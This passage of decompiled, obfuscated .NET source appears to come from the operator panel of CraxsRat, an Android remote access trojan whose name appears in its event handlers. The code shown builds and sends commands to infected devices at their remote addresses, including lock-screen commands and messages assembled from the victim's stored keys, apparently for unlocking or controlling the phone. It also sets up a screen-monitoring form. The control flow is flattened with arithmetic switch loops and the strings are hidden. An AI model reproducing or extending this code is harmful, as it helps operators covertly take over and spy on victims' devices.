              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0034B1F4C22 + this.textsend.Text + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003195A505B + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003195A505B + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((SelfRemove) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00334150B0A),
              (object) ((SelfRemove) this).classClient
            });
            this.textsend.Text = EXGuarder.\u003352F6317;
            num1 = (int) num3 * 1115501536 ^ 1254666888;
            continue;
          case 2:
            goto label_6;
          case 3:
            int num4 = this.textsend.Text.Length <= 0 ? 1731981289 : (num4 = 403777976);
            num1 = num4 ^ (int) num3 * 420548919;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void DrakeUIAvatar1_Click(object sender, EventArgs e)
    {
      if (((SelfRemove) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((SelfRemove) this).classClient).Keys.Split(':');
label_2:
        int num1 = 1913592400;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 * -1550686783 - ~~(1260910451 + 366636339 * -1456588483) ^ 800964444 - (375311729 * -1212308927 - (1742578480 - 428376423))) + (2146949743 * -1849220513 + (1140078727 - -2086554741)) ^ 335142697 - 1250942889)) % 3U)
          {
            case 0:
              goto label_2;
            case 1:
              goto label_10;
            case 2:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ((SelfRemove) this).classClient.SendMessage(new object[4]
              {
                (object) ((Data._Closure\u0024__) ((SelfRemove) this).classClient).myClient,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003164A0069 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((SelfRemove) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u003646D582A),
                (object) ((SelfRemove) this).classClient
              });
              num1 = (int) num2 * -1472934026 ^ 1435886353;
              continue;
            default:
              goto label_6;
          }
        }
label_10:
        return;
label_6:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_8:
        int num3 = -115065672;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) ((num3 * -1550686783 - ~~(1260910451 + 366636339 * -1456588483) ^ 800964444 - (375311729 * -1212308927 - (1742578480 - 428376423))) + (2146949743 * -1849220513 + (1140078727 - -2086554741)) ^ 335142697 - 1250942889)) % 3U)
          {
            case 0:
              goto label_8;
            case 1:
              goto label_4;
            case 2:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * -1804992472 ^ 702918372;
              continue;
            default:
              goto label_13;
          }
        }
label_4:
        return;
label_13:;
      }
    }

    static ScreenReaderV2() => WebViewMonitor.HWND_TOPMOST = new IntPtr(-1);

    public ScreenReaderV2()
    {
label_1:
      int num1 = 57282329;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((--~(~((590378040 - 1949070812 + (104318837 - 27130226) - ~(1502493199 - -583508371)) * 1340497907) - num2) ^ ~-1889744412) + 740041659)) % 11U)
        {
          case 0:
            ((WebViewMonitor) this).recordit = false;
            num1 = (int) num3 * -704644940 ^ 1757951933;
            continue;
          case 1:
            ((ScreenShoter) this).InitializeComponent();
            num1 = (int) num3 * 1373768964 ^ 1692452568;
            continue;
          case 2:
            ((WebViewMonitor) this).isdown = false;
            ((WebViewMonitor) this).isclick = false;
            num1 = (int) num3 * -628559052 ^ -356214479;
            continue;
          case 3:
            this.Load += new EventHandler(((ScreenShoter) this).CraxsRatkfvuiorkenfudpajrsnCraxsRatskjasnhfcs);
            num1 = (int) num3 * -428836788 ^ -1461072159;
            continue;
          case 4:
            this.KeyDown += new KeyEventHandler(((ScreenShoter) this).ScreenShoter_KeyDown_1);
            ((WebViewMonitor) this).ScreenShotFoucs = false;
            num1 = (int) num3 * 52600332 ^ -333189407;
            continue;
          case 5:
            ((WebViewMonitor) this).Title = EXGuarder.\u0030D104905;
            ((WebViewMonitor) this).@checked = false;
            ((WebViewMonitor) this).sizearry = new string[38]
            {
              EXGuarder.\u0035B68760D,
              EXGuarder.\u00302532046,
              EXGuarder.\u00375561917,
              EXGuarder.\u00319575D25,
              EXGuarder.\u003636F554D,
              EXGuarder.\u0036D575306,
              EXGuarder.\u00353680210,
              EXGuarder.\u0033F721F40,
              EXGuarder.\u003654F6C70,
              EXGuarder.\u0031D1B526F,
              EXGuarder.\u0033F75012B,
              EXGuarder.\u0031A396428,
              EXGuarder.\u003591A6359,
              EXGuarder.\u003141F6762,
              EXGuarder.\u003162E3338,
              EXGuarder.\u00308524036,
              EXGuarder.\u003685B7040,
              EXGuarder.\u00313250524,
              EXGuarder.\u0034B3C1E15,
              EXGuarder.\u00341792F0B,
              EXGuarder.\u0031B69385C,
              EXGuarder.\u003681D7238,
              EXGuarder.\u0033C2A604C,
              EXGuarder.\u0034C752353,
              EXGuarder.\u0037854053D,
              EXGuarder.\u003233F275B,
              EXGuarder.\u0035C302C0F,
              EXGuarder.\u00301042065,
              EXGuarder.\u00348265276,
              EXGuarder.\u00303447079,
              EXGuarder.\u003374C2B69,
              EXGuarder.\u00323514B1A,
              EXGuarder.\u00350790D68,
              EXGuarder.\u003585B346E,
              EXGuarder.\u0033738651C,
              EXGuarder.\u003182E3E55,
              EXGuarder.\u0032A756E77,
              EXGuarder.\u0036A0C3048
            };
            ((WebViewMonitor) this).Swaping = false;
            num1 = (int) num3 * 1771866623 ^ 1446984925;
            continue;
          case 6:
            ((WebViewMonitor) this).Rnew = 0;
            num1 = (int) num3 * 842561435 ^ -1487140754;
            continue;
          case 7:
            goto label_3;
          case 8:
            this.FormClosing += new FormClosingEventHandler(((ScreenShoter) this).CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscajhg);
            num1 = (int) num3 * 1161086104 ^ -360558823;
            continue;
          case 9:
            ((WebViewMonitor) this).tiks = 0;
            ((WebViewMonitor) this).iscontroled = (object) false;
            ((WebViewMonitor) this).keepmeto = false;
            num1 = (int) num3 * 642984522 ^ -1056519910;
            continue;
          case 10:
            goto label_1;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }
  }
}
